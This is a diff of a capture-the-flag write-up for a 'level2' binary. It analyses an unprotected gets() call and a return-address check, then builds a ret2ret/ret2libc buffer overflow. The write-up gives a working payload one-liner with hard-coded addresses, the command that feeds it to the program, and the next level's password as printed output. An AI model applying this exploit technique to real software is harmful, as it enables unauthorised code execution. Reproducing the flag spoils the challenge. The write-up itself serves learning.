@@ -1,17 +1,38 @@
-# We set a breakpoint inside p function to analyze it.
-# Then, we discover it accepts a buffer and check the value of the ret address to exit early if it's doesnt succeed.
-# So we craft 80 bytes of noise, then a ret2ret with the return address of p function.
+## Analysis
 
-# After, the ret to ret we fulfill with a reference to system instruction, exit instruction and shell string to launch it as a ret2ret exploit.
-# These 3 values lay on top of the stack, and we'll be pop by the second ret following our will (TODO: didn't understand that sentence).
+The program calls gets(), which is a non-protected function against buffer overflow.
 
-# So our exploit is built by :
-#  - python -c "print "A"*80 + "\x
+`0x080484ed <+25>:    call   0x80483c0 <gets@plt>`
+
+But, following the gets a check of the saved return address is perfomed against a bits mask.
+This one only return true against address beginning by 0x08.
+
+`0x080484fb <+39>:    and    $0xb0000000,%eax`
+`0x08048500 <+44>:    cmp    $0xb0000000,%eax`
+
+In the contrary, the wrongful address is printed and the program exit.
+If the check succeed, the buffer is print and then a copy return to main function via strdup().
+
+## Exploit
+
+Buffer overflow + ret2ret : we overwrite the return address with address of the ret instruction.
+When this last one executes ("0x0804853e <+106>") it'll loop on itself on then return to our shellcode, which lay on top of the stack.
+
+## Crafting
+
+0		      80                         84                    	  88                     92                 96
+[RANDOM_PADDING_STRING][ <p> RET_INSTRUCTION_ADDR][<libc> SYSTEM_CALL_ADDR][RANDOM_PADDING_STRING][SHELL_STRING_ADDR]
+			^                   |		 ^
+			| RET instruction   |            | RET instruction (2nd)
+-------------------------		    --------------
+
+We overflow the saved return address with the address of <p> ret instruction.
+Followed by the address of system call from the libc, four-bytes wides noise and an address of a shell string, mocking the x86 CALL instruction.
+
+## Shooting
 
 python -c 'print "A"*80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "BBBB" + "\x92\x82\x04\x08"' > /tmp/payload_level2
 cat /tmp/payload_level2 - | ./level2
 
 cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
-
-# TODO
